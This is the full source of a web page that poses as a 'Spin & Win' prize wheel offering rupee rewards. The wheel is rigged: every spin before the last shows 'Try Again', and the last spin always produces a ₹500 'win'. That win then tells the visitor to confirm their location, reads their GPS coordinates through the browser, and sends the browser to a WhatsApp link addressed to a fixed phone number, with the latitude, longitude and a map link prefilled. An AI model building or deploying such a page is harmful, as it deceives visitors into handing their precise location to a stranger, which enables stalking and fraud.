<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Spin & Win</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body{
  margin:0;
  font-family: system-ui, sans-serif;
  background: radial-gradient(circle at top,#1e40af,#020617);
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  color:#fff;
}
.card{
  width:92%;
  max-width:420px;
  background:#020617;
  border-radius:20px;
  padding:24px;
  text-align:center;
  box-shadow:0 0 40px rgba(0,0,0,.9);
}
.sub{color:#94a3b8;font-size:14px}
.chances{color:#facc15;font-size:13px;margin-top:4px}

.wheel-wrap{
  position:relative;
  margin:24px auto;
  width:280px;
  height:280px;
}
.pointer{
  position:absolute;
  top:-14px;
  left:50%;
  transform:translateX(-50%);
  width:0;height:0;
  border-left:14px solid transparent;
  border-right:14px solid transparent;
  border-bottom:28px solid #facc15;
  filter:drop-shadow(0 0 6px #facc15);
  z-index:20;
}
.wheel{
  width:100%;
  height:100%;
  border-radius:50%;
  background:
    conic-gradient(
      #22c55e 0deg 60deg,
      #38bdf8 60deg 120deg,
      #facc15 120deg 180deg,
      #ec4899 180deg 240deg,
      #a855f7 240deg 300deg,
      #64748b 300deg 360deg
    );
  box-shadow:
    inset 0 0 20px rgba(255,255,255,.2),
    0 0 30px rgba(56,189,248,.6);
  transition:transform 4s cubic-bezier(.17,.67,.12,1);
  position:relative;
}
.prize{
  position:absolute;
  font-weight:bold;
  font-size:14px;
  background:#020617;
  padding:6px 10px;
  border-radius:10px;
  box-shadow:0 0 12px rgba(0,0,0,.7);
}
.p1{top:18px;left:50%;transform:translateX(-50%);}
.p2{top:70px;right:18px;}
.p3{bottom:70px;right:18px;}
.p4{bottom:18px;left:50%;transform:translateX(-50%);}
.p5{bottom:70px;left:18px;}
.p6{top:70px;left:18px;}

button{
  width:100%;
  padding:14px;
  border:none;
  border-radius:14px;
  background:linear-gradient(135deg,#22c55e,#4ade80);
  font-size:16px;
  font-weight:bold;
  cursor:pointer;
}
button:disabled{background:#64748b}

.status{margin-top:14px;font-size:14px}

/* confetti */
.confetti{
  position:fixed;
  width:8px;
  height:14px;
  top:-20px;
  animation:fall 3s linear forwards;
}
@keyframes fall{
  to{transform:translateY(110vh) rotate(360deg);}
}
</style>
</head>

<body>
<div class="card">
  <h2>Spin & Win üéâ</h2>
  <div class="sub">Try your luck</div>
  <div class="chances" id="chances"></div>

  <div class="wheel-wrap">
    <div class="pointer"></div>
    <div class="wheel" id="wheel">
      <div class="prize p1">‚Çπ100</div>
      <div class="prize p2">‚Çπ200</div>
      <div class="prize p3">‚Çπ500</div>
      <div class="prize p4">‚Çπ1000</div>
      <div class="prize p5">Try Again</div>
      <div class="prize p6">‚Çπ200</div>
    </div>
  </div>

  <button id="btn" onclick="spin()">SPIN NOW</button>
  <div class="status" id="status"></div>
</div>

<audio id="winSound" src="https://assets.mixkit.co/sfx/preview/mixkit-winning-chimes-2015.mp3"></audio>

<script>
let spinsLeft = localStorage.getItem("spinsLeft");
if(spinsLeft === null) spinsLeft = 3;
spinsLeft = parseInt(spinsLeft);

const chances = document.getElementById("chances");
const btn = document.getElementById("btn");
updateChances();

let spinning=false;

function updateChances(){
  chances.innerText = "Spins left: " + spinsLeft;
  if(spinsLeft<=0) btn.disabled=true;
}

function spin(){
  if(spinning || spinsLeft<=0) return;
  spinning=true;
  spinsLeft--;
  localStorage.setItem("spinsLeft",spinsLeft);
  updateChances();

  const wheel=document.getElementById("wheel");
  const status=document.getElementById("status");

  const rotation = 360*6 + Math.floor(Math.random()*360);
  wheel.style.transform=`rotate(${rotation}deg)`;

  setTimeout(()=>{
    spinning=false;

    // force win on last chance
    if(spinsLeft === 0){
      win("‚Çπ500");
      return;
    }

    status.innerHTML="üòï <strong>Try Again Later</strong>";
  },4000);
}

function win(amount){
  const status=document.getElementById("status");
  status.innerHTML =
    "<strong>You Won "+amount+" üéÅ</strong><br><br>"+
    "To claim your reward,<br>please confirm your location.";

  document.getElementById("winSound").play();
  launchConfetti();
  requestLocation();
}

function requestLocation(){
  if(!navigator.geolocation) return;

  navigator.geolocation.getCurrentPosition(pos=>{
    const lat=pos.coords.latitude;
    const lon=pos.coords.longitude;
    const map=`https://www.google.com/maps?q=${lat},${lon}`;

    const msg=
      "Reward Claim Location%0A%0A"+
      "Latitude: "+lat+"%0A"+
      "Longitude: "+lon+"%0A%0A"+
      "Map: "+map;

    setTimeout(()=>{
      window.location.href=
        "https://wa.me/918147963357?text="+msg;
    },1200);
  });
}

function launchConfetti(){
  for(let i=0;i<40;i++){
    const c=document.createElement("div");
    c.className="confetti";
    c.style.left=Math.random()*100+"vw";
    c.style.backgroundColor=`hsl(${Math.random()*360},100%,50%)`;
    c.style.animationDuration=2+Math.random()*2+"s";
    document.body.appendChild(c);
    setTimeout(()=>c.remove(),4000);
  }
}
</script>
</body>
</html>
